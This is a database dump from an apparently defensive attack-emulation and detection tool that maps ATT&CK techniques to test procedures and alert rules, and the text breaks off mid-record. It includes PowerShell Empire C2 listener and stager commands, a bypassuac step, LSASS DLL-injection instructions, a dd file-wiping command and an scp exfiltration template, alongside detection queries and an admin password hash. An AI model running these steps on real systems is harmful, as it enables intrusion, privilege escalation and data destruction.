48	1. At least one listener is running.\n2. powershell-empire launcher_bat is installed on endpoint.\n3. Interact with agent.	\N	\N	yes	\N	\N	2021-08-24 14:11:29.833223+00	T1105	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["All bat files uploaded to target machine is an example of this technique."], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:50.622Z", "pre-requisite": [], "pre-requistes": "1. At least one listener is running.\\n2. powershell-empire launcher_bat is installed on endpoint.\\n3. Interact with agent.", "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}, {"cleanup": "", "command": ["\\"index : filebeat-*\\nquery : message:(*scp*) OR (*sftp*) OR (*rsync*)\\""], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:52.064Z", "pre-requisite": [], "pre-requistes": "\\"1. Step 1 similar like above.\\n2. scp command logged in audit.log\\n5. scp <filepath> <username>@ip:/path command executed\\n\\n\\n\\"", "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
176	\N	\N	\N	yes	\N	\N	2021-08-24 14:11:29.833223+00	T1012	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["['https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1012/T1012.md']"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:51.873Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
52	1. Powershell-empire is installed on Kali.	\N	\N	yes	\N	\N	2021-08-24 14:11:29.833223+00	T1071.001	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["1. Run below commands which will give us listener and agent for C2.\\nempire> uselistener http\\nempire> set Name test\\nempire> set <kali_machine's_ip_reachable_from_target>\\nempire> execute\\nempire> usestager windows/launcher_bat\\nempire> set Listener test\\nempire> execute\\n2. Copy /tmp/launcher.bat file to the target machine/endpoint and then execute it in target manually from cmd prompt(administrator).\\n"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:50.682Z", "pre-requisite": [], "pre-requistes": "1. Powershell-empire is installed on Kali.", "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
40	1. At least one listener is running.\n2. powershell-empire launcher_bat is installed on endpoint.	\N	\N	yes	\N	\N	2021-08-24 14:11:29.833223+00	T1548	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["1. Interact with powershell empire agent by using below command.\\nagents> interact <agent_id>\\n2. Run below command which will give new agent with elevated(bypassuac) privileges.\\nagents> bypassuac <listener_id>"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:50.720Z", "pre-requisite": [], "pre-requistes": "1. At least one listener is running.\\n2. powershell-empire launcher_bat is installed on endpoint.", "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
119	\N	\N	other	yes	["1. Couldn't try to create timer service on Linux machine using systemd."]	\N	2021-08-24 14:11:29.833223+00	T1053.006	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["[\\"1. Adversaries may abuse systemd timers to perform task scheduling for initial or recurring execution of malicious code.\\"]"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:51.017Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
128	\N	\N	\N	yes	\N	\N	2021-08-24 14:11:29.833223+00	T1547.002	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["[\\"1. Generate pentestlab.dll using below link :\\nhttps://pentestlab.blog/2017/04/04/dll-injection/\\n2. Copy dll from kali to windows machine.\\n3.Install RemoteDLL from below link on windows mahcine:\\nhttps://securityxploded.com/remotedll.php\\n4. Launch command prompt and type \\"lsass.exe\\" and enter.\\n5. Launch remotedll and select option \\"Inject DLL\\". Injection method as \\"https://pentestlab.blog/2017/04/04/dll-injection/\\". Select target process as \\"LSASS.exe\\". Select the copied DLL and click \\"Inject DLL\\".\\n6. Injection is failing but it captures the expected event.\\"]"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:51.125Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
56	1. At least one listener is running.\n2. powershell-empire launcher_bat is installed on endpoint.\n3. Interact with agent.	\N	\N	yes	\N	\N	2021-08-24 14:11:29.833223+00	T1113	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["Run below command.\\nagent_id> sc"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:50.751Z", "pre-requisite": [], "pre-requistes": "1. At least one listener is running.\\n2. powershell-empire launcher_bat is installed on endpoint.\\n3. Interact with agent.", "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}, {"cleanup": "", "command": ["https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1133/T1133.md"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:51.523Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
182	\N	\N	\N	yes	\N	\N	2021-08-24 14:11:29.833223+00	T1016	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["['https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1016/T1016.md']"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:51.945Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
99	\N	\N	Other	yes	Need to setup a bad/malicious content website.	\N	2021-08-24 14:11:29.833223+00	T1189	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["[\\"Exploit web browser by using malicious website.\\", \\"Or use malicious content website to get application access token\\", \\"1. A user visits a website that is used to host the adversary controlled content.\\", \\"2. Scripts automatically execute, typically searching versions of the browser and plugins for a potentially vulnerable version.\\", \\"3. The user may be required to assist in this process by enabling scripting or active website components and ignoring warning dialog boxes.\\", \\"4. Upon finding a vulnerable version, exploit code is delivered to the browser.\\nIf exploitation is successful, then it will give the adversary code execution on the user's system unless other protections are in place.\\"]"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:50.771Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
105	\N	\N		yes	["1. macOS attack/detection not tried. Need mac machine to try."]	\N	2021-08-24 14:11:29.833223+00	T1059.002	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["[\\"1. osascript /path/to/script\\", \\"2. Use macOS native APIs NSAppleScript or OAScript\\", \\"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.002/T1059.002.md\\"]"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:50.849Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}, {"cleanup": "", "command": ["[\\"1. https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1559.002/T1559.002.md\\"]"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:50.938Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
110		\N	sct, hta	yes	\N	\N	2021-08-24 14:11:29.833223+00	T1059.007	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["[\\"1. Install powershell empire on Kali. Create Javascript and mshta stagers.\\", \\"1. Run below commands which will give us listener and agent for C2.\\nempire> uselistener http\\nempire> set Name test\\nempire> set <kali_machine's_ip_reachable_from_target>\\nempire> execute\\nempire> usestager windows/hta\\nempire> set Listener test\\nempire>set OutFile /tmp/launcher.hta\\nempire> execute\\nFrom Windows VM command prompt launch hta agent. (It internally uses mshta utility to launch)\\n> launcher.hta\\", \\"1. Run below commands which will give us listener and agent for C2.\\nempire> uselistener http\\nempire> set Name test\\nempire> set <kali_machine's_ip_reachable_from_target>\\nempire> execute\\nempire> usestager windows/launcher_sct\\nempire> set Listener test\\nempire> execute\\"]"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:50.914Z", "pre-requisite": [], "pre-requistes": "", "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
113	\N	\N	\N	yes	["1. Atomic Red team didn't give output for attack. Got warning for .NET framework version."]	\N	2021-08-24 14:11:29.833223+00	T1106	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["[\\"1. https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1106/T1106.md\\"]"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:50.949Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
116	\N	\N	sh	yes	\N	\N	2021-08-24 14:11:29.833223+00	T1053.001	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["[\\"echo \\"echo Hello From Atomic Red Team\\" | at now + 1 minute\\", \\"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.001/T1053.001.md\\"]"], "executor": ["shell"], "platform": "", "file_name": null, "platforms": "Linux", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:50.984Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
118	\N	\N	sh	yes	\N	\N	2021-08-24 14:11:29.833223+00	T1053.003	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["[\\"1. https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.003/T1053.003.md\\"]"], "executor": ["shell"], "platform": "", "file_name": null, "platforms": "Linux", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:51.006Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
120	\N	\N	other	yes	["1. Couldn't find much DLLs which can use native API and then execute payload."]	\N	2021-08-24 14:11:29.833223+00	T1129	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["[\\"1. Adversaries may abuse shared modules to execute malicious payloads. The Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in NTDLL.dll and is part of the Windows Native API which is called from functions like CreateProcess, LoadLibrary, etc. of the Win32 API.\\", \\"2. The module loader can load DLLs:\\n\\nvia specification of the (fully-qualified or relative) DLL pathname in the IMPORT directory;\\n\\nvia EXPORT forwarded to another DLL, specified with (fully-qualified or relative) pathname (but without extension);\\n\\nvia an NTFS junction or symlink program.exe.local with the fully-qualified or relative pathname of a directory containing the DLLs specified in the IMPORT directory or forwarded EXPORTs;\\n\\nvia <file name=\\"filename.extension\\" loadFrom=\\"fully-qualified or relative pathname\\"> in an embedded or external \\"application manifest\\". The file name refers to an entry in the IMPORT directory or a forwarded EXPORT.\\n\\"]"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:51.029Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
138	\N	\N	\N	yes	\N	\N	2021-08-24 14:11:29.833223+00	T1176	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1176"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:51.300Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
141	\N	\N	\N	yes	\N	\N	2021-08-24 14:11:29.833223+00	T1543.002	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1543.002/T1543.002.md"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:51.362Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}, {"cleanup": "", "command": ["\\"index : filebeat-*\\nquery : (match_body.message:*systemctl*and(*usrchanges*or*syschanges*))\\""], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:52.087Z", "pre-requisite": [], "pre-requistes": "\\"1. Install filebeat and auditd like previous sigma rules\\n2. Install systemd service\\n3. add rule for audit watch over directories like /etc/systemd/system and /usr/lib/systemd/system . These directories have all service files either user defined or os installed\\n4. test with systemctl start/stop/disabled/enabled <name>.service\\n5. check the audit log with keywords like usrchanges and syschanges as mentioned in audit rule\\"", "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
183	\N	\N	\N	yes	\N	\N	2021-08-24 14:11:29.833223+00	T1529	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["['https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1529/T1529.md']"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:51.966Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
142	\N	\N	\N	yes	MacOS Dependency.	\N	2021-08-24 14:11:29.833223+00	T1543.004	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1543.004"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:51.382Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
160	\N	\N	\N	yes	\N	\N	2021-08-24 14:11:29.833223+00	T1560	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["['https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1560/T1560.md']"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:51.660Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}, {"cleanup": "", "command": ["\\"index: filebeat-*\\nquery: (match_body.message : (*exe= *tar AND *comm= tar) OR match_body.message : *gzip* OR match_body.message : *zip*)\\""], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:52.122Z", "pre-requisite": [], "pre-requistes": "\\"1. Steps remain same as above.\\n2. create few temp and non empty files and folders on the client and tar, gzip and zip these files and folders.\\n3. check in kibana for filebeat events with message keywords like tar*, gzip*, zip*\\"", "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
162	\N	\N	\N	yes	\N	\N	2021-08-24 14:11:29.833223+00	T1485	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["['https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1485/T1485.md']"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:51.693Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}, {"cleanup": "", "command": ["\\"index : filebeat-*\\nquery : (match_body.message:( *comm= dd*))\\""], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:52.052Z", "pre-requisite": [], "pre-requistes": "\\"1. Install filebeat , configure with Elasticsearch (Unable to configure Logstash) and auditd(This is similar for all auditd services). \\n2. command used to delete a file by overwriting the cntents completely is sudo dd if=/dev/random of=<filetobecopied> bs=1k count=<filesize> conv=notrunc\\n3. audit rules remain same, although syslog can be added into the rules and log filtering possible via syslog as well.\\n4. cp syslog contents into a temp file `testfile.txt` (optional)\\n5. now execute above command and look for events under filebeat -*\\n6. for attack, login into the client machine and generate events using above steps\\"", "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
166	\N	\N	\N	yes	\N	\N	2021-08-24 14:11:29.833223+00	T1048.003	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["['https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1048.003/T1048.003.md']"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:51.746Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
172	\N	\N	\N	yes	\N	\N	2021-08-24 14:11:29.833223+00	T1571	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["['https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1571/T1571.md']"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:51.818Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
173	\N	\N	\N	yes	\N	\N	2021-08-24 14:11:29.833223+00	T1027	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["['https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1027/T1027.md']"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:51.830Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
175	\N	\N	\N	yes	\N	\N	2021-08-24 14:11:29.833223+00	T1055.001	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["['https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1055.001/T1055.001.md']"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:51.860Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
194	"1. Create multiple accounts on the machine from which you are attempting attack\n2. Login into each account and try attempting access to the client machine where filebeat in installed.\n3. swtiching between users throught terminal cannot attain this attack.\n4. Update rule with filebeat index, type, query. Detail information in Rule changes\n4. Check rule in elastalert using command elastalert-test-rule rulesfold/rule.yml for query pattern\n5. Check in Kibana dashboard for events."	\N	\N	yes	\N	\N	2021-08-24 14:11:29.833223+00	T1110	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["\\"index: filebeat-*\\npriority: 3\\nrealert:\\n  minutes: 0\\nfilter:\\n- query_string:\\n    query: (message:*authentication*failure)\\ntype: any\\n Edited type. indec, aggregation , query, buffer time, max_aggregation of rusers > 3 etc. made the rule simple. removing \\""], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:52.098Z", "pre-requisite": [], "pre-requistes": "\\"1. Create multiple accounts on the machine from which you are attempting attack\\n2. Login into each account and try attempting access to the client machine where filebeat in installed.\\n3. swtiching between users throught terminal cannot attain this attack.\\n4. Update rule with filebeat index, type, query. Detail information in Rule changes\\n4. Check rule in elastalert using command elastalert-test-rule rulesfold/rule.yml for query pattern\\n5. Check in Kibana dashboard for events.\\"", "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
\.


--
-- Data for Name: auth_group; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public.auth_group (id, name) FROM stdin;
\.


--
-- Data for Name: auth_group_permissions; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public.auth_group_permissions (id, group_id, permission_id) FROM stdin;
\.


--
-- Data for Name: auth_permission; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public.auth_permission (id, name, content_type_id, codename) FROM stdin;
1	Can add log entry	1	add_logentry
2	Can change log entry	1	change_logentry
3	Can delete log entry	1	delete_logentry
4	Can view log entry	1	view_logentry
5	Can add permission	2	add_permission
6	Can change permission	2	change_permission
7	Can delete permission	2	delete_permission
8	Can view permission	2	view_permission
9	Can add group	3	add_group
10	Can change group	3	change_group
11	Can delete group	3	delete_group
12	Can view group	3	view_group
13	Can add user	4	add_user
14	Can change user	4	change_user
15	Can delete user	4	delete_user
16	Can view user	4	view_user
17	Can add content type	5	add_contenttype
18	Can change content type	5	change_contenttype
19	Can delete content type	5	delete_contenttype
20	Can view content type	5	view_contenttype
21	Can add session	6	add_session
22	Can change session	6	change_session
23	Can delete session	6	delete_session
24	Can view session	6	view_session
\.


--
-- Data for Name: auth_user; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public.auth_user (id, password, last_login, is_superuser, username, first_name, last_name, email, is_staff, is_active, date_joined) FROM stdin;
1	pbkdf2_sha256$216000$lHnTnZXfto0O$cyb4MXyrH6ncO7f7GKSSapx6kOBVKWOggEf0awqnz5g=	2021-02-10 14:05:32.108411+00	t	admin				t	t	2021-02-10 12:46:59.859235+00
\.


--
-- Data for Name: auth_user_groups; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public.auth_user_groups (id, user_id, group_id) FROM stdin;
\.


--
-- Data for Name: auth_user_user_permissions; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public.auth_user_user_permissions (id, user_id, permission_id) FROM stdin;
\.


--
-- Data for Name: detection; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public.detection (detection_id, support, script_type, comment, color, data_source, attributes, sub_technique_id, script, modify_date) FROM stdin;
6	no	other	["1. Physical inspection of hardware is required.", "2. Integrity checking of pre-OS boot mechanisms is required."]	#FFFFFF	Component firmware,BIOS,Disk forensics,EFI	"{'accuracy_score': 0}"	T1195.003	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": ["[\\"1. Perform physical inspection of hardware to look for potential tampering.\\", \\"2. Perform integrity checking on pre-OS boot mechanisms that can be manipulated for malicious purposes.\\"]"], "sigma": [], "osquery": [], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
8	no	other	Very vague detetcion description :  Inspect important application binary file hashes, locations, and modifications for suspicious/unexpected values.	#FFFFFF		"{'accuracy_score': 0}"	T1565.003	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": ["[\\"Inspect important application binary file hashes, locations, and modifications for suspicious/unexpected values.\\"]"], "sigma": [], "osquery": [], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
18	yes		["1. Monitor file access on removable media.","2. Detect processes that execute from removable media after it is mounted or when initiated by a user.","3. Need to test using removable media."]	#800080	File monitoring,Data loss prevention,File monitoring,Asset management	"{'accuracy_score': 50}"	T1091	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [{"rule": "win_external_device.yml", "elastalert": ""}], "osquery": ["select * from file_events;", "select DISTINCT p.name, p.path, pos.remote_address, pos.remote_port from process_open_sockets pos LEFT JOIN processes p ON pos.pid = p.pid WHERE pos.remote_port != 0 AND p.name != '';"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
135	yes	OSQuery		#008000	Windows Registry,Process monitoring,Process commandline parameters,Process commandline parameters,Process monitoring	{"accuracy_score": 90}	T1543.003	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [{"rule": "win_susp_service_path_modification.yml", "elastalert": {"name": "suspicious_service_path_modification", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "(process.command_line:*config* AND process.command_line:*binpath* AND process.executable:*\\\\\\\\sc.exe AND process.command_line:(*powershell* OR *cmd*))"}}], "realert": {"minutes": 0}, "priority": 2, "description": "Detects service path modification to PowerShell or cmd."}}, {"rule": "win_new_service_creation.yml", "elastalert": {"name": "new_service_creation", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "((process.command_line:*create* AND process.command_line:*binpath* AND process.executable:*\\\\\\\\sc.exe) OR (process.command_line:*new\\\\-service* AND process.executable:*\\\\\\\\powershell.exe))"}}], "realert": {"minutes": 0}, "priority": 4, "description": "Detects creation of a new service."}}], "osquery": ["select name,type,data from registry where key='HKEY_LOCAL_MACHINE\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\RunServices';", "select name,type,data from registry where path like 'HKEY_LOCAL_MACHINE\\\\\\\\System\\\\\\\\CurrentControlSet\\\\\\\\Services\\\\\\\\%\\\\\\\\ImagePath' and data like '%powershell%';", "select pr.pid, pr.name, usr.username, pr.path, pr.cmdline from processes pr LEFT JOIN users usr ON pr.uid = usr.uid WHERE pr.cmdline != '';"], "elasticsiem": [{"name": "Persistence via Update Orchestrator Service Hijack", "query": "process where event.type == \\"start\\" and\\n process.parent.executable : \\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\svchost.exe\\" and\\n process.parent.args : (\\"netsvcs\\", \\"UsoSvc\\") and\\n not process.executable :\\n (\\n \\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\UsoClient.exe\\",\\n \\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\MusNotification.exe\\",\\n \\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\MusNotificationUx.exe\\",\\n \\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\MusNotifyIcon.exe\\",\\n \\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\WerFault.exe\\",\\n \\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\WerMgr.exe\\"\\n )"}, {"name": "Unusual Persistence via Services Registry", "query": "registry where registry.path : (\\"HKLM\\\\\\\\SYSTEM\\\\\\\\*ControlSet*\\\\\\\\Services\\\\\\\\*\\\\\\\\ServiceDLL\\", \\"HKLM\\\\\\\\SYSTEM\\\\\\\\*ControlSet*\\\\\\\\Services\\\\\\\\*\\\\\\\\ImagePath\\") and\\n not registry.data.strings : (\\"C:\\\\\\\\windows\\\\\\\\system32\\\\\\\\Drivers\\\\\\\\*.sys\\", \\n \\"\\\\\\\\SystemRoot\\\\\\\\System32\\\\\\\\drivers\\\\\\\\*.sys\\", \\n \\"system32\\\\\\\\DRIVERS\\\\\\\\USBSTOR\\") and\\n not (process.name : \\"procexp??.exe\\" and registry.data.strings : \\"C:\\\\\\\\*\\\\\\\\procexp*.sys\\") and\\n not process.executable : (\\"C:\\\\\\\\Program Files*\\\\\\\\*.exe\\", \\n \\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\svchost.exe\\", \\n \\"C:\\\\\\\\Windows\\\\\\\\winsxs\\\\\\\\*\\\\\\\\TiWorker.exe\\", \\n \\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\drvinst.exe\\", \\n \\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\services.exe\\", \\n \\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\msiexec.exe\\", \\n \\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\regsvr32.exe\\")"}, {"name": "System Shells via Services", "query": "process where event.type in (\\"start\\", \\"process_started\\") and\\n process.name : (\\"services.exe\\", \\"sc.exe\\") and\\n process.parent.name : (\\"cmd.exe\\", \\"powershell.exe\\") and\\n 